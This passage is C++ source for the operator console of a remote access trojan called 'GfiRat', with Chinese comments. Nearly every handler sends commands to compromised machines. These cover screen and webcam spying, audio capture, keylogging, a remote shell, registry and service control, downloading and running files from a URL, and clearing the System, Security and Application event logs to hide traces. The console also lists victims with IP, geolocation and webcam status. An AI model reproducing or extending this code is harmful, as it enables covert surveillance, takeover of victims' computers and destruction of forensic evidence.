		g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SSLIST: // 服务管理
		g_pFrame->PostMessage(WM_OPENPSERLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PROXY_START: //代理映射
		g_pFrame->PostMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_CHAT_START:
		g_pFrame->PostMessage(WM_OPENCHATDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DLLMAIN:
		g_pFrame->PostMessage(WM_OPENDLLDLG, 0, (LPARAM)pContext);
		break;
	case TOKEN_INFO_YES: //主机筛选
		g_pFrame->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
		break;
	case TOKEN_INFO_NO: //主机筛选
		g_pFrame->PostMessage(WM_NOMODIFYLIST, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}
}

// 需要显示进度的窗口
void CGfiRatServerDlg::ProcessReceive(ClientContext* pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog* dlg = (CDialog*)pContext->m_Dialog[1];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg*)dlg)->OnReceive();
			break;
		case newSCREENSPY_DLG:
			((newCScreenSpyDlg*)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CVideoDlg*)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg*)dlg)->OnReceive();
			break;
		case SPEAKER_DLG:
			((CSpeakerDlg*)dlg)->OnReceive();
			break;
		case PROXY_DLG:
			((CAudioDlg*)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

#endif




//右键消息处理
#if 1   
void CGfiRatServerDlg::OnDeskLook()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken[2];
	bToken[0] = COMMAND_GN;
	bToken [1]= DESK_TOP;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
}


void CGfiRatServerDlg::OnFilemanager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
	//LocalFree((LPBYTE)&bToken);
}


void CGfiRatServerDlg::OnKeyboard()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
	//LocalFree((LPBYTE)&bToken);


}



void CGfiRatServerDlg::OnScreenspy()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
	//LocalFree((LPBYTE)&bToken);
}

void CGfiRatServerDlg::Onnewscreenspy()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_newSCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
	//LocalFree((LPBYTE)&bToken);
}


void CGfiRatServerDlg::OnSystem()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));
	//LocalFree((LPBYTE)&bToken);
}


void CGfiRatServerDlg::OnWebcam()
{
	// TODO: 在此添加命令处理程序代码
	 	BYTE	bToken = COMMAND_WEBCAM;
 	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGfiRatServerDlg::OnAudioListen()
{
	// TODO: 在此添加命令处理程序代码

 	BYTE	bToken = COMMAND_AUDIO;
 	SendSelectCommand(&bToken, sizeof(BYTE));
// 	LocalFree((LPBYTE)&bToken);
}


void CGfiRatServerDlg::OnSpeakerListen()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SPEAKER;
	SendSelectCommand(&bToken, sizeof(BYTE));
	// 	LocalFree((LPBYTE)&bToken);
}



void CGfiRatServerDlg::OnRemoteshell()
{
	// TODO: 在此添加命令处理程序代码

	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));
//	LocalFree((LPBYTE)&bToken);
}


void CGfiRatServerDlg::OnSysinfo()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SYSINFO;
	SendSelectCommand(&bToken, sizeof(BYTE));
//	LocalFree((LPBYTE)&bToken);
}


void CGfiRatServerDlg::OnRegedit()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_REGEDIT;
	SendSelectCommand(&bToken, sizeof(BYTE));
//	LocalFree((LPBYTE)&bToken);
}



void CGfiRatServerDlg::OnSermanager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SERMANAGER;
	SendSelectCommand(&bToken, sizeof(BYTE));
	//	LocalFree((LPBYTE)&bToken);
}

void CGfiRatServerDlg::OnProxy()    //代理映射
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_PROXY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGfiRatServerDlg::OnJincheng()
{
	// TODO: 在此添加命令处理程序代码
}


void CGfiRatServerDlg::OnChuangkou()
{
	// TODO: 在此添加命令处理程序代码
}


void CGfiRatServerDlg::OnChongzhi()
{
	// TODO: 在此添加命令处理程序代码
}


void CGfiRatServerDlg::OnDownexec()
{
	// TODO: 在此添加命令处理程序代码
	CInputDialog	dlg;
	dlg.Init(_T("下载者"), _T("请输入要下载文件的地址:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}


void CGfiRatServerDlg::OnUpdateServer()
{
	// TODO: 在此添加命令处理程序代码
	CInputDialog	dlg;
	dlg.Init(_T("下载更新服务端"), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}


void CGfiRatServerDlg::OnOpenUrlHide()
{
	// TODO: 在此添加命令处理程序代码
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要隐藏访问的网址:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}


void CGfiRatServerDlg::OnOpenUrlShow()
{
	// TODO: 在此添加命令处理程序代码
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要显示访问的网址:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}


struct MSGBOX
{
	CHAR Title[200];
	CHAR szText[1000];
	UINT Type;
}MsgBox;



void CGfiRatServerDlg::OnShowmsg()
{
	// TODO: 在此添加命令处理程序代码

	CMsgBox dlg;
remsg:
	if (dlg.DoModal() != IDOK)
		return;

	if ((strlen(dlg.m_Title) < 1) | (strlen(dlg.m_Text) < 1))
	{
		MessageBox("请输入发送标题及内容!!!", "提示", MB_OK | MB_ICONWARNING);
		goto remsg;
	}

	ZeroMemory(&MsgBox, sizeof(MSGBOX));
	strcpy(MsgBox.Title, dlg.m_Title.GetBuffer(0));
	strcpy(MsgBox.szText, dlg.m_Text.GetBuffer(0));
	MsgBox.Type = dlg.m_msgButton | dlg.m_msgIcon;

	BYTE* bToken = new BYTE[sizeof(MSGBOX) + 1];
	bToken[0] = COMMAND_SHOW_MSG;
	memcpy(&bToken[1], &MsgBox, sizeof(MSGBOX));

	SendSelectCommand(bToken, sizeof(MSGBOX) + 1);
	delete bToken;
	goto remsg;
}



void CGfiRatServerDlg::OnChat()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_CHAT;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGfiRatServerDlg::OnCleanevent()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_CLEAN_EVENT;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGfiRatServerDlg::OnCleanSystem()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_CLEAN_System;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGfiRatServerDlg::OnCleanSecurity()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_CLEAN_Security;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGfiRatServerDlg::OnCleanApplication()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_CLEAN_Application;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGfiRatServerDlg::OnIp()
{
	// TODO: 在此添加命令处理程序代码
}


void CGfiRatServerDlg::OnDilixinxi()
{
	// TODO: 在此添加命令处理程序代码
}


void CGfiRatServerDlg::OnAll()
{
	// TODO: 在此添加命令处理程序代码
}


void CGfiRatServerDlg::OnRemove()
{
	// TODO: 在此添加命令处理程序代码
	if (MessageBox("确认卸载服务端吗", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGfiRatServerDlg::OnLogoff()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
	//LocalFree((LPBYTE)&bToken);
}


void CGfiRatServerDlg::OnReboot()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
	//LocalFree((LPBYTE)&bToken);
}


void CGfiRatServerDlg::OnShutdown()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
	//LocalFree((LPBYTE)&bToken);
}


void CGfiRatServerDlg::OnRenameRemark()
{
	// TODO: 在此添加命令处理程序代码
	CString strTitle;
	if (g_pConnectView.GetSelectedCount() == 1)
		strTitle.Format(_T("更改主机(%s)的备注"), g_pConnectView.GetItemText(g_pConnectView.GetSelectionMark(), 2));
	else
		strTitle = _T("批量更改主机备注");
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength() == 0)
		return;

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	POSITION pos = g_pConnectView.GetFirstSelectedItemPosition();
	while (pos)
	{
		int	nItem = g_pConnectView.GetNextSelectedItem(pos);
		g_pConnectView.SetItemText(nItem, 3, dlg.m_str);
	}

	delete[] lpPacket;
}


void CGfiRatServerDlg::OnChangeGroup()
{
	// TODO: 在此添加命令处理程序代码
	//CChangeGroup m_group;
	//if (m_group.DoModal() == IDOK)
	//{

	//	int	nPacketLength = m_group.strGroup.GetLength() + 2;
	//	LPBYTE	lpPacket = new BYTE[nPacketLength];
	//	lpPacket[0] = COMMAND_CHANGE_GROUP;
	//	memcpy(lpPacket + 1, m_group.strGroup.GetBuffer(0), nPacketLength - 1);
	//	SendSelectCommand(lpPacket, nPacketLength);

	//	CString strTemp, strGroupName;
	//	CPcView* pView = NULL;
	//	int count = g_pTabView->m_wndTabControl.GetItemCount();
	//	for (int i = 0; i < count; i++)
	//	{
	//		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
	//		int n = strTemp.ReverseFind('(');
	//		if (n > 0)
	//		{
	//			strGroupName = strTemp.Left(n);
	//		}
	//		else
	//		{
	//			strGroupName = strTemp;
	//		}
	//		if (strGroupName == m_group.strGroup)
	//		{
	//			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
	//			break;
	//		}
	//	}
	//	if (pView == NULL)
	//	{
	//		strTemp.Format(_T("%s(0)"), m_group.strGroup);
	//		g_pTabView->AddGroup(strTemp);
	//		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(count)->GetHandle()));
	//		pView->NewInitialUpdate();
	//		pView->m_iocpServer = m_iocpServer;
	//	}

	//	POSITION pos;
	//	for (; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
	//	{
	//		int m = m_pListCtrl->GetNextSelectedItem(pos);

	//		CString	str;
	//		ClientContext* pContext = (ClientContext*)(m_pListCtrl->GetItemData(m));

	//		int nCnt = pView->m_pListCtrl->GetItemCount();
	//		int i = 0;
	//		i = pView->m_pListCtrl->InsertItem(nCnt, str, 15);

	//		pView->m_pListCtrl->SetItemText(i, 0, m_pListCtrl->GetItemText(m, 0));

	//		pView->m_pListCtrl->SetItemText(i, 1, m_pListCtrl->GetItemText(m, 1));

	//		pView->m_pListCtrl->SetItemText(i, 2, m_pListCtrl->GetItemText(m, 2));

	//		pView->m_pListCtrl->SetItemText(i, 3, m_pListCtrl->GetItemText(m, 3));

	//		pView->m_pListCtrl->SetItemText(i, 4, m_pListCtrl->GetItemText(m, 4));

	//		pView->m_pListCtrl->SetItemText(i, 5, m_pListCtrl->GetItemText(m, 5));

	//		pView->m_pListCtrl->SetItemText(i, 6, m_pListCtrl->GetItemText(m, 6));

	//		pView->m_pListCtrl->SetItemText(i, 7, m_pListCtrl->GetItemText(m, 7));

	//		pView->m_pListCtrl->SetItemText(i, 8, m_pListCtrl->GetItemText(m, 8));

	//		pView->m_pListCtrl->SetItemText(i, 9, m_pListCtrl->GetItemText(m, 9));

	//		pView->m_pListCtrl->SetItemText(i, 10, m_pListCtrl->GetItemText(m, 10));

	//		pView->m_pListCtrl->SetItemText(i, 11, m_pListCtrl->GetItemText(m, 11));

	//		// 指定唯一标识
	//		pView->m_pListCtrl->SetItemData(i, (DWORD)pContext);

	//		m_pListCtrl->DeleteItem(m);

	//		g_pTabView->UpDateNumber();
	//		g_pFrame->ShowConnectionsNumber();
	//		g_pFrame->ShowOSCount();
	//	}
	//}
}


void CGfiRatServerDlg::OnSelectAll()
{
	// TODO: 在此添加命令处理程序代码
	for (int i = 0; i <g_pConnectView.GetItemCount(); i++)
	{
		g_pConnectView.SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		g_pConnectView.SetCheck(i, TRUE);
	}
}


void CGfiRatServerDlg::OnUnselectAll()
{
	// TODO: 在此添加命令处理程序代码
	for (int i = 0; i < g_pConnectView.GetItemCount(); i++)
	{
		g_pConnectView.SetItemState(i, 0, LVIS_SELECTED);
		g_pConnectView.SetCheck(i, FALSE);
	}
}

#endif

//添加分组
afx_msg LRESULT CGfiRatServerDlg::OnAddfindgroup(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	if (pContext == NULL)
		return -1;
	try
	{
		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO* LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		BOOL bFind = false;
		CString strGroupName, strTemp;

		//int nTabs = m_wndTabControl.GetItemCount();
		//for (int i = 0; i < nTabs; i++)
		//{
		//	strTemp = m_wndTabControl.GetItem(i)->GetCaption();
		//	int n = strTemp.ReverseFind('(');
		//	if (n > 0)
		//	{
		//		strGroupName = strTemp.Left(n);
		//	}
		//	else
		//	{
		//		strGroupName = strTemp;
		//	}

		//	if (strlen(LoginInfo->UpGroup) == NULL)
		//	{
		//		lstrcpy(LoginInfo->UpGroup, "Default");//默认分组
		//	}

		//	if (strGroupName == LoginInfo->UpGroup)
		//	{
		//		bFind = true;
		//		CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(i)->GetHandle()));
		//		pView->m_iocpServer = g_pConnectView->m_iocpServer;
		//		pView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
		//		break;
		//	}
		//}
		//if (!bFind)
		//{
		//	strGroupName.Format("%s(1)", LoginInfo->UpGroup);
		//	AddGroup(strGroupName);
		//	CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(m_wndTabControl.GetItem(nTabs)->GetHandle()));
		//	pView->NewInitialUpdate();
		//	pView->m_iocpServer = g_pConnectView->m_iocpServer;
		//	pView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
		//}
		g_pFrame->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
	}
	catch (...) {}

	return 0;
}

//列表删除客户信息
afx_msg LRESULT CGfiRatServerDlg::OnRemovefromlist(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	if (pContext == NULL)
		return -1;
//	CPcView* pView = g_pConnectView;
	CString strOSCount, strLogText, strVersion, IPaddress, strAddr;
	int nTabs = g_pConnectView.GetItemCount();
	for (int n = 0; n < nTabs; n++)
	{
		//pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		// 删除链表过程中可能会删除Context
		try
		{
			int nCnt = g_pConnectView.GetItemCount();
			for (int i = 0; i < nCnt; i++)
			{
				if (pContext == (ClientContext*)g_pConnectView.GetItemData(i))
				{
					strOSCount = g_pConnectView.GetItemText(i, 3);
					if (strOSCount.Find(_T("NT")) != -1)
					{
						g_pFrame->nOSCount[0]--;
					}
					if (strOSCount.Find(_T("XP")) != -1)
					{
						g_pFrame->nOSCount[2]--;
					}
					if (strOSCount.Find(_T("Vista")) != -1)
					{
						g_pFrame->nOSCount[4]--;
					}
					if (strOSCount.Find(_T("Win7")) != -1)
					{
						g_pFrame->nOSCount[6]--;
					}
					if (strOSCount.Find(_T("2000")) != -1)
					{
						g_pFrame->nOSCount[1]--;
					}
					if (strOSCount.Find(_T("2003")) != -1)
					{
						g_pFrame->nOSCount[3]--;
					}
					if (strOSCount.Find(_T("2008")) != -1)
					{
						g_pFrame->nOSCount[5]--;
					}
					if (strOSCount.Find(_T("Win8")) != -1)
					{
						g_pFrame->nOSCount[7]--;
					}
					if (strOSCount.Find(_T("2012")) != -1)
					{
						g_pFrame->nOSCount[8]--;
					}
					if (strOSCount.Find(_T("Win10")) != -1)
					{
						g_pFrame->nOSCount[9]--;
					}
					if (strOSCount.Find(_T("Win2016")) != -1)
					{
						g_pFrame->nOSCount[10]--;
					}
					IPaddress = g_pConnectView.GetItemText(i, 0);
					strVersion = g_pConnectView.GetItemText(i, 10);
					strOSCount.Replace("Win ", "");

					if (((CGfiRatServerApp*)AfxGetApp())->m_bIsQQwryExist)
					{
						strAddr = g_pConnectView.GetItemText(i, 11);
						strLogText.Format("主机下线: [%s]   OS: [Win %s]   Ver: [%s]   地理位置: [%s]", IPaddress, strOSCount, strVersion, strAddr);
					}
					else
					{
						strLogText.Format("主机下线: [%s]   OS: [Win %s]   Ver: [%s]", IPaddress, strOSCount, strVersion);
					}
					InsertLogItem(strLogText, 0, 24);

					g_pConnectView.DeleteItem(i);
					break;
				}
			}

			// 关闭相关窗口

			switch (pContext->m_Dialog[0])
			{
			case FILEMANAGER_DLG:
			case SCREENSPY_DLG:
			case WEBCAM_DLG:
			case AUDIO_DLG:
			case KEYBOARD_DLG:
			case SYSTEM_DLG:
			case SHELL_DLG:
			case SYSINFO_DLG:
			case REGEDIT_DLG:
			case DLL_DLG:
				::PostMessage(((CDialog*)pContext->m_Dialog[1])->GetSafeHwnd(), WM_CLOSE, NULL, NULL);
				//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
			//	((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
				break;
			default:
				break;
			}
		}
		catch (...) {}

	}
	// 更新当前连接总数
	CString str;
	str.Format(_T("Online: %d"), g_pConnectView.GetItemCount());
	m_wndStatusBar.SetPaneText(3, str);

	str.Format(_T("NT:[%d] Win2000:[%d] XP:[%d] Win2003:[%d] Vista:[%d] Win2008:[%d] Win7:[%d] Win8:[%d] Win2012:[%d] Win10:[%d] Win2016:[%d]"),
		nOSCount[0],
		nOSCount[1],
		nOSCount[2],
		nOSCount[3],
		nOSCount[4],
		nOSCount[5],
		nOSCount[6],
		nOSCount[7],
		nOSCount[8],
		nOSCount[9],
		nOSCount[10]);
	m_wndStatusBar.SetPaneText(2, str);
	return 0;
}


afx_msg LRESULT CGfiRatServerDlg::OnAddtolist(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText, strOS, strLogText;
	try
	{
		LOGININFO* LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		CString	str;
		//		lstrcpy( pContext->m_group, MyDecode(LoginInfo->UpGroup) );
		int nCnt = g_pConnectView.GetItemCount();

		int i = 0;

		i = g_pConnectView.InsertItem(nCnt, str, 15);

		// 外网IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

		g_pConnectView.SetItemText(i, 0, IPAddress);

		// 内网IP
		g_pConnectView.SetItemText(i, 1, inet_ntoa(LoginInfo->IPAddress));

		// 主机名
		g_pConnectView.SetItemText(i, 2, LoginInfo->HostName);

		////////////////////////////////////////////////////////////////////////////////////////
		//操作系统
			//版本信息
		strOS = LoginInfo->OsVerInfoEx;
		char* pszOS = NULL;

		

			if (strcmp(strOS,"Windows NT 4.0")==0)
			{
				pszOS = _T("NT");
				g_pFrame->nOSCount[0]++;
			}
			if (strcmp(strOS, "Windows 2000") == 0)
			{
				pszOS = _T("2000");
				g_pFrame->nOSCount[1]++;
			}
			if (strcmp(strOS, "Windows XP") == 0 || strcmp(strOS, "Windows XP Professional x64 Edition") == 0)
			{
				pszOS = _T("XP");
				g_pFrame->nOSCount[2]++;
			}
			if (strcmp(strOS, "Windows Server 2003") == 0 || strcmp(strOS, "Windows Server 2003 R2") == 0)
			{
				pszOS = _T("2003");
				g_pFrame->nOSCount[3]++;
			}
			if (strcmp(strOS, "Windows Vista") == 0)
			{
					pszOS = _T("Vista");
					g_pFrame->nOSCount[4]++;
			}
			if (strcmp(strOS, "Windows Server 2008") == 0 || strcmp(strOS, "Windows Server 2008 R2") == 0)
			{

					pszOS = _T("2008");
					g_pFrame->nOSCount[5]++;
				
			}
			if (strcmp(strOS, "Windows 7") == 0)
			{

				pszOS = _T("Win 7");
				g_pFrame->nOSCount[6]++;
			}
			if (strcmp(strOS, "Windows 8") == 0 || strcmp(strOS, "Windows 8.1") == 0)
			{

				pszOS = _T("Win 8");
				g_pFrame->nOSCount[7]++;
			}

			if (strcmp(strOS, "Windows Server 2012") == 0)
			{
					pszOS = _T("2012");
					g_pFrame->nOSCount[8]++;
			}

			if (strcmp(strOS, "Windows 10") == 0)
			{
				
					pszOS = _T("Win10");
					g_pFrame->nOSCount[9]++;
			}
			if (strcmp(strOS, "2016") == 0)
			{
				pszOS = _T("2016");
				g_pFrame->nOSCount[10]++;

			}
					
			
		
		strOS.Format
		(
			_T("%s"),// (Build %d)
			pszOS
			//			LoginInfo->OsVerInfoEx.dwBuildNumber
		);
		g_pConnectView.SetItemText(i, 3, strOS);

		// CPU
		str.Format(_T("%s*%dMHz"), LoginInfo->CPUNumber, LoginInfo->CPUClockMhz);
		g_pConnectView.SetItemText(i, 4, str);

		//内存大小
		str.Format(_T("%dMB"), LoginInfo->MemSize);
		g_pConnectView.SetItemText(i, 5, str);

		// Speed
		str.Format(_T("%d"), LoginInfo->dwSpeed);
		g_pConnectView.SetItemText(i, 6, str);

		//摄像头
		str = LoginInfo->bIsWebCam ? _T("Yes") : _T("No");
		g_pConnectView.SetItemText(i, 7, str);

		strOS.Replace("Win ", "");
		strToolTipsText.Format("Host	: %s\nCam	: %s\nIP	: %s\nOS	: Windows %s\nGroup	: %s", LoginInfo->HostName, str, IPAddress, strOS, LoginInfo->UpGroup);

		//筛选
		g_pConnectView.SetItemText(i, 8, "--");

		//DDOS
		g_pConnectView.SetItemText(i, 9, "--");

		//版本信息
	//	str.Format("%s", LoginInfo->szVersion);
		g_pConnectView.SetItemText(i, 10, "xx");


		//g_pConnectView.SetItemText(i, 10, LoginInfo->szVersion);

		if (((CGfiRatServerApp*)AfxGetApp())->m_bIsQQwryExist)
		{
			//地理位置
			str = m_QQwry->IPtoAdd(IPAddress);
			g_pConnectView.SetItemText(i, 11, str);
			strToolTipsText += _T("\nArea	: ");
			strToolTipsText += str;
		}
		else
		{
			g_pConnectView.SetItemText(i, 11, _T("无纯真数据库"));
		}

		g_pConnectView.SetItemText(i, 12, LoginInfo->Virus);
		// 指定唯一标识
		//g_pFrame->ShowOSCount();
		//g_pConnectView.SetItemData(i, (DWORD)pContext);
		//g_pTabView->UpDateNumber();
		//g_pFrame->ShowConnectionsNumber();
			// 更新当前连接总数
		CString stros;
		stros.Format(_T("Online: %d"), g_pConnectView.GetItemCount());
		m_wndStatusBar.SetPaneText(3, stros);

		stros.Format(_T("NT:[%d] Win2000:[%d] XP:[%d] Win2003:[%d] Vista:[%d] Win2008:[%d] Win7:[%d] Win8:[%d] Win2012:[%d] Win10:[%d] Win2016:[%d]"),
			nOSCount[0],
			nOSCount[1],
			nOSCount[2],
			nOSCount[3],
			nOSCount[4],
			nOSCount[5],
			nOSCount[6],
			nOSCount[7],
			nOSCount[8],
			nOSCount[9],
			nOSCount[10]);
		m_wndStatusBar.SetPaneText(2, stros);
		g_pConnectView.SetItemData(i, (DWORD)pContext);








		//if (m_iocpServer->m_bIsAutoD)
		//{
		//	SendAutoAttack(pContext);//新上线自动参与
		//}

	
		if (((CGfiRatServerApp*)AfxGetApp())->m_bIsQQwryExist)
			strLogText.Format("主机上线: [%s]   OS: [Win %s]   Ver: [%s]   地理位置: [%s]   分组: [%s]", IPAddress, strOS, /*LoginInfo->szVersion*/ LoginInfo->UpGroup, str, LoginInfo->UpGroup);
		else
			strLogText.Format("主机上线: [%s]   OS: [Win %s]   Ver: [%s]   分组: [%s]", IPAddress, strOS, /*LoginInfo->szVersion*/ LoginInfo->UpGroup, LoginInfo->UpGroup);
		InsertLogItem(strLogText, 0, 18);

	}
	catch (...) {}

	return 0;
}


void CGfiRatServerDlg::OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	// TODO: 在此添加控件通知处理程序代码
	CMenu	popup;
	popup.LoadMenu(IDR_LIST);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;

	*pResult = 0;
}


void CGfiRatServerDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{
	if (g_pConnectView.GetSelectedCount() < 1)
	{
		return;
	}
	// TODO: Add your command handler code here
	POSITION pos = g_pConnectView.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = g_pConnectView.GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)g_pConnectView.GetItemData(nItem);
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, pData, nSize);
		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}

afx_msg LRESULT CGfiRatServerDlg::OnOpenshelldialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
